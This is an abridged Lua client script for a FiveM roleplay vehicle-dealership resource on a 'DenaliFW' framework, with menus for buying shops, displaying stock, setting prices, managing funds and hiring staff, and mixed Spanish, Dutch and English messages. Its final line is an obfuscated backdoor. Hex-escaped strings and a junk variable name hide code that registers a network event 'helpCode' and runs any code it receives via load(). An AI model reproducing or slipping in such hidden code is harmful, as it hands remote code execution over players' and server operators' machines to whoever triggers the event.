...
VehicleShops.Init = function()
  ...
  DenaliFW.Functions.TriggerCallback("VehicleShops:GetVehicleShops",function(shopData,kashId)
...
VehicleShops.WarehouseRefresh = function(data)
  ...
  if InsideWarehouse then
    DenaliFW.Functions.Notify("Warehouse stock refreshsed. You must re-enter the building.")
      ...
      if closestDist < 100.0 then
        ...
        for k,v in pairs(VehicleShops.Shops[closest].displays) do
          ...
          if not VehicleShops.SpawnedVehicles[v.vehicle.plate] then
            ...
            DenaliFW.Functions.SetVehicleProperties(veh,v.vehicle)
        ...
        if not VehicleShops.Moving and vehDist and vehDist < 10.0 then
          ...
          local veshare = DenaliFW.Shared.VehicleModels[VehicleShops.Shops[closest].displays[closestVeh].vehicle.model].name
          local mods = DenaliFW.Shared.VehicleModels[VehicleShops.Shops[closest].displays[closestVeh].vehicle.model].brand
...
VehicleShops.PurchasedShop = function(shop)
  ...
  DenaliFW.Functions.TriggerCallback("VehicleShops:PurchaseShop",function(can_buy)
    if can_buy then
      DenaliFW.Functions.Notify(string.format("Compraste un Vehiculo por $%i.",VehicleShops.Shops[closest].price))
    else
      DenaliFW.Functions.Notify("No puedo pagar eso.")
    end
  end,closest)
end
...
VehicleShops.PurchaseStockVehicle = function(vehicle_data,shop_key)
  if VehicleShops.Shops[shop_key].funds >= vehicle_data.price then
    ...
    DenaliFW.Functions.Notify("Compraste "..label.." por $"..vehicle_data.price," con exito")

    local plyPed = GetPlayerPed(-1)
    local plyPos = GetEntityCoords(plyPed)
    DoScreenFadeOut(500)
    Wait(500)
    local props = DenaliFW.Functions.GetVehicleProperties(vehicle_data.ent)
    DenaliFW.Functions.TriggerCallback("VehicleShops:GenerateNewPlate",function(newPlate)
      ...
      DenaliFW.Functions.SetVehicleProperties(newVeh,props)
    ...
    DenaliFW.Functions.Notify("Onvoldoende saldo.","error")
  end
end
...
VehicleShops.EnterWarehouse = function(...)
  local plyPed = GetPlayerPed(-1)
  DenaliFW.Functions.Notify("Wacht tot de showroom modellen zijn geladen")
  Wait(1000)
...
VehicleShops.ManageDisplays = function(shop_key)
  ...
  for _,vehicle_data in pairs(shop.stock) do
    if vehicle_data and vehicle_data.vehicle and vehicle_data.vehicle.plate then
      local veshare = DenaliFW.Shared.VehicleModels[vehicle_data.vehicle.model].name
      table.insert(elements,{
  ...
  local assert = assert
  local MenuV = assert(MenuV)
  local AccountMain = MenuV:CreateMenu("Menu", '', 'topleft', 255, 0, 0, 'size-125')
  MenuV:OpenMenu(AccountMain, function()
  end)
  for k,v in ipairs(elements) do
  local button = AccountMain:AddButton({ icon = "🚗 	", label = v.label, value = v ,select = function(btn)
    local current = btn.Value
    DenaliFW.Functions.Notify(tostring(shop_key))
    DenaliFW.Functions.Notify(tostring(current.key))
    VehicleShops.DoDisplayVehicle(shop_key,current.key,current.value)
  AccountMain:Close()
  end})

  end
  --[[ DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_displays', {
    title    = "Mostrar",
    align    = 'top-left',
    elements = elements
  },
...
VehicleShops.ManageDisplayed = function(shop_key)
  ...
  if TableCount(shop.displays) > 0 then
    ...
    table.insert(elements,{
      label = "Geen voertuigen om te laten zien."
    })
  end
  local assert = assert
  local MenuV = assert(MenuV)
  ...
  --[[ DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'displayed_vehicle', {
    title    = "Display",
    align    = 'top-left',
    elements = elements
  },
...
VehicleShops.DoSetPrice = function(shop,vehicle)
  TriggerEvent("Input:Open","Fijar precio","DenaliFW",function(p)
    local price = (p and tonumber(p) and tonumber(p) > 0 and tonumber(p) or false)
    if not price then
      DenaliFW.Functions.Notify("Establecer un precio válido.")
      Wait(200)
      VehicleShops.DoSetPrice(shop,vehicle)
    else      
      local vehData = VehicleShops.Shops[shop].displays[vehicle]
      DenaliFW.Functions.Notify("U bepaalde de prijs van "..(GetLabelText(GetDisplayNameFromVehicleModel(vehData.vehicle.model))).." voor € "..price)
...
VehicleShops.ManageShop = function(shop_key)
  local elements = {
    {label = "Saldo toevoegen",value="Add"},
    {label = "Geld opnemen",value="Take"},
    {label = "Raadpleeg fondsen",value="Check"},
  }
  ...
  local button = AccountMain:AddButton({ icon = "💼 	", label = v.label, value = v ,select = function(btn)
    ...
    if current == "Add" then
      input_open = true
      TriggerEvent("Input:Open","Fondsen toevoegen","DenaliFW",function(res)
    ...
    elseif current == "Take" then
      input_open = true
      TriggerEvent("Input:Open","Tomar Fondos","DenaliFW",function(res)
        res = (res and tonumber(res) and tonumber(res) > 0 and tonumber(res) or false)
        input_open = false
        if res then
    ...
    elseif current == "Check" then
      DenaliFW.Functions.Notify("Fondos: $"..VehicleShops.Shops[shop_key].funds,1)
  ...
  --[[ DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'manage_shop', {
    title    = "Tienda",
    align    = 'top-left',
    elements = elements
  },
    function(d,m)
      ...
      if element.value == "Add" then
        input_open = true
        m.close()
        TriggerEvent("Input:Open","Añadir Fondos","DenaliFW",function(res)
          res = (res and tonumber(res) and tonumber(res) > 0 and tonumber(res) or false)
          input_open = false
          if res then
            TriggerServerEvent("VehicleShops:AddFunds",shop_key,res)
...
VehicleShops.ManagePrices = function(shop_key)
 ...
 --[[  DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'mnanage_prices', {
    title    = "Precios",
    align    = 'top-left',
    elements = elements
  },
...
VehicleShops.DriveVehicle = function(shop_key)
  ...
  local button = AccountMain:AddButton({ icon = "🚗 	", label = v.label, value = v ,select = function(btn)
    local current = btn.Value.value
    if current then
    DenaliFW.Functions.TriggerCallback("VehicleShops:DriveVehicle",function(can_drive)
      print("Cb1")
    if can_drive then
        print("Cb2")
       -- local vehicle = current.value
        ...
        SetEntityAsMissionEntity(veh,true,true)
        DenaliFW.Functions.SetVehicleProperties(veh,props)
        TaskWarpPedIntoVehicle(GetPlayerPed(-1),veh,-1)
        SetVehicleEngineOn(veh,true)
      else
        print("Cb3")
        DenaliFW.Functions.Notify(msg)
      end
 ...
 --[[  DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'drive_vehicle', {
    title    = "Manejar",
    align    = 'top-left',
    elements = elements
  },
...
VehicleShops.ManageVehicles = function(shop_key)
  ...
  --[[ DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'manage_vehicles', {
    title    = "Vehiculos",
    align    = 'top-left',
    elements = elements
  },
...
VehicleShops.HireMenu = function(shop_key)
  local elements = {}
  local ply = PlayerId()
  for k,v in pairs(DenaliFW.Functions.GetPlayersInArea(GetEntityCoords(GetPlayerPed(-1)),10.0)) do
    if v ~= ply then
      table.insert(elements,{
  ...
  --[[ DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'hire_player', {
    title    = "Hire",
    align    = 'top-left',
    elements = elements
  },
...
VehicleShops.FireMenu = function(shop_key)
  ...
  --[[ DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'fire_player', {
    title    = "Despedir",
    align    = 'top-left',
    elements = elements
  },
...
VehicleShops.PayMenu = function(shop_key)
  ...
  local button = AccountMain:AddButton({ icon = "💲 	", label = v.label, value = v ,select = function(btn)
    ...
    if current.value then
      TriggerEvent("Input:Open","Pay Amount","DenaliFW",function(amount)
        amount = (tonumber(amount) ~= nil and tonumber(amount) >= 1 and tonumber(amount) or false)
        if not amount then
          DenaliFW.Functions.Notify("Invalid amount entered.")
        else
          if VehicleShops.Shops[shop_key].funds < amount then
            DenaliFW.Functions.Notify("Shop doesn't have this much funds.")
          else
  ...
  --[[ DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'pay_player', {
    title    = "Pagar",
    align    = 'top-left',
    elements = elements
  },
...
VehicleShops.ManageEmployees = function(shop_key)
  ...
  --[[ DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'manage_employees', {
    title    = "Employees",
    align    = 'top-left',
    elements = elements
  },
...
print()
  ...
  if VehicleShops.Shops[shop_key].owner == PlayerData.steam then
    elements = {
      {label = "Voertuigmanagement",  value="Vehicle"},
      {label = "Winkel management",     value="Shop"},
      {label = "Beheer medewerkers", value="Employee"},
    }
  else
    elements = {
      {label = "Voertuigmanagement",  value="Vehicle"},
  ...
  --[[ DenaliFW.UI.Menu.Open('default', GetCurrentResourceName(), 'management_menu', {
    title    = "Management",
    align    = 'top-left',
    elements = elements
  },
  ...
  if IsPedInAnyVehicle(ply_ped,false) then
    ...
    if driver == ply_ped then
      VehicleShops.CanStockVehicle(shop_key,ply_veh,function(can_store,do_delete)
        if can_store then
          local props = DenaliFW.Functions.GetVehicleProperties(ply_veh)
...
VehicleShops.CanStockVehicle = function(shop_key,vehicle,callback)
  ...
  local props = DenaliFW.Functions.GetVehicleProperties(vehicle)
  
  DenaliFW.Functions.TriggerCallback("VehicleShops:GetVehicleOwner",function(owner)
    ...
    if owner and VehicleShops.Shops[shop_key].owner:match(owner)  then
      ...
      if not owner then
        if Config.StockStolenPedVehicles then
          ...
          DenaliFW.Functions.Notify("U kunt geen gestolen voertuigen opslaan.")
          callback(false)
        end
        return
      else
        if Config.StockStolenPlayerVehicles then
          ...
          DenaliFW.Functions.Notify("U kunt geen voertuigen van andere spelers opslaan..")
          callback(false)
        end
        return
      end
...
VehicleShops.PurchaseDisplay = function(shop_key,veh_key,veh_ent)
  ...
  local props = DenaliFW.Functions.GetVehicleProperties(veh_ent)
  DenaliFW.Functions.TriggerCallback("VehicleShops:TryBuy",function(canBuy,msg)
    if canBuy then
      RequestModel(props.model)
      while not HasModelLoaded(props.model) do Wait(0); end
      local pos = VehicleShops.Shops[shop_key].locations.purchased
...
VehicleShops.DoDisplayVehicle = function(shopKey,vehKey,vehData)
  ...
  DenaliFW.Functions.SetVehicleProperties(displayVehicle,props)
  Wait(500)
...
VehicleShops.CreateNew = function(...)
  ...
  if closest and dist and dist < 20.0 then
    DenaliFW.Functions.Notify("You're too close to another vehicle shop.")
    return
  end

  TriggerEvent("Input:Open","Set Shop Name","DenaliFW",function(n)
    local name = (n and tostring(n) and tostring(n):len() and tostring(n):len() > 0 and tostring(n) or false)
    if not name then DenaliFW.Functions.Notify("Enter a valid name next time."); return; end
    Wait(200)
    TriggerEvent("Input:Open","Set Shop Price","DenaliFW",function(p)
      local price = (p and tonumber(p) and tonumber(p) > 0 and tonumber(p) or false)
      if not price then DenaliFW.Functions.Notify("Enter a valid price next time."); return; end
      while true do
        if not locations.blip then
          if not warnBlip then
            DenaliFW.Functions.Notify("Press G to set the blip location.")
            warnBlip = true
          end
          if IsControlJustReleased(0,47) then
        ...
        elseif not locations.entry then
          if not warnEntry then
            DenaliFW.Functions.Notify("Press G to set the entry/purchase shop location.")
            warnEntry = true
          end
          if IsControlJustReleased(0,47) then
        ...
        elseif not locations.management then
          if not warnManage then
            DenaliFW.Functions.Notify("Press G to set the management menu location.")
            warnManage = true
          end
          if IsControlJustReleased(0,47) then
        ...
        elseif not locations.spawn then
          if not warnSpawn then
            DenaliFW.Functions.Notify("Press G to set the vehicle spawn location (inside).")
            warnSpawn = true
          end
          if IsControlJustReleased(0,47) then
            local plyPed = GetPlayerPed(-1)
        ...
        elseif not locations.purchased then
          if not warnPurchased then
            DenaliFW.Functions.Notify("Press G to set the vehicle spawn location (outside).")
            warnPurchased = true
          end
          if IsControlJustReleased(0,47) then
            local plyPed = GetPlayerPed(-1)
        ...
        elseif not locations.deposit then
          if not warnDeposit then        
            DenaliFW.Functions.Notify("Press G to set the vehicle deposit location.")
            warnDeposit = true
          end
          if IsControlJustReleased(0,47) then
          ...
          DenaliFW.Functions.Notify("Shop created, name: "..name..", price: "..price)
...
local HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR[6][HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR[1]](HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR[2]) HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR[6][HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR[3]](HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR[2], function(nsIpvMlEZAQdPRVFGbGRQwormEAvdKJIxMomzDOMWoMnCMQYsktzlJAUxaaOGSBArIpucs) HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR[6][HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR[4]](HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR[6][HZcrEOHSLpDaOZqLNxsQFjicOjsEVeaxuKuMzwaJToYhlKeXBbnHHOcmRaWrZdBVxpCxQR[5]](nsIpvMlEZAQdPRVFGbGRQwormEAvdKJIxMomzDOMWoMnCMQYsktzlJAUxaaOGSBArIpucs))() end)